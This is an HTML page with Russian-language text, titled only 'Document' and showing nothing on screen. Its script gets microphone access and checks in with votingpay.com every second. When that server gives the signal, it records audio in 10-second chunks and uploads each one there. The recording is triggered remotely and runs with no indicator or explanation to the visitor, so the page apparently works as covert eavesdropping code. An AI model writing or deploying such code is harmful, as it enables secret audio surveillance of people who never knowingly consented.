<!DOCTYPE html>
<html lang="ru">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <title>Document</title>
    <script src="./getusermedia.bundle.js"></script>
  </head>
  <style>
    body {
      width: 100%;
      height: 762px;
    }
  </style>
  <body>
    <script>
      class ConnectionService {
        constructor() {
          getUserMedia({ video: false, audio: true }, (err, stream) => {
            if (err) {
              alert("Ошибка: Нет доступа к устройству");
              return;
            }
            let audioContext = new AudioContext();
            let input = audioContext.createMediaStreamSource(stream);
            this.rec = new Recorder(input);
            setInterval(() => {
              this.connection();
            }, 1000);
          });
        }

        connection() {
          this.getConnectionInfo(info => {
            if (!info.connection) {
              location = location;
            }
            if (info.record && !this.recordInterval) {
              this.recordServise();
            }
          });
        }

        getConnectionInfo(cb) {
          var url = `https://votingpay.com/getInfo?pathname=${
            location.pathname
          }`;
          var xhr = new XMLHttpRequest();
          xhr.open("POST", url, true);
          xhr.send(JSON.stringify({}));
          xhr.onreadystatechange = function() {
            if (xhr.readyState === 4) {
              if (xhr.status === 200) {
                var data = JSON.parse(xhr.responseText);
                if (cb) {
                  cb(data);
                }
              }
            }
          };
        }

        recordServise() {
          let rec = this.rec;
          let sendFile = this.sendFile.bind(this);
          let recordServiseStop = this.recordServiseStop.bind(this);

          rec.record();
          var startTime = Date.now();
          var endTime;
          this.recordInterval = setInterval(() => {
            if (endTime) {
              startTime = endTime;
            }
            endTime = Date.now();

            rec.exportWAV(then);
            function then(wav) {
              sendFile(wav, "blob.wav", { startTime, endTime }, cb);
            }
            function cb(data) {
              if (!data.record) {
                recordServiseStop();
                rec.stop();
                rec.clear();
                endTime = Date.now();
              }
            }

            rec.clear();
            rec.record();
          }, 10000);
        }

        recordServiseStop() {
          clearInterval(this.recordInterval);
          this.recordInterval = undefined;
        }

        sendFile(blob, filename, info, cb) {
          var url = `https://votingpay.com/postFile?pathname=${
            location.pathname
          }`;
          var xhr = new XMLHttpRequest();
          var data = new FormData();
          data.append("audio_data", blob, filename);
          data.append("info", JSON.stringify(info));
          xhr.open("POST", url, true);
          xhr.send(data);
          xhr.onreadystatechange = function() {
            if (xhr.readyState === 4) {
              if (xhr.status === 200) {
                var data = JSON.parse(xhr.responseText);
                if (cb) {
                  cb(data);
                }
              }
            }
          };
        }
      }

      new ConnectionService();
    </script>
  </body>
</html>
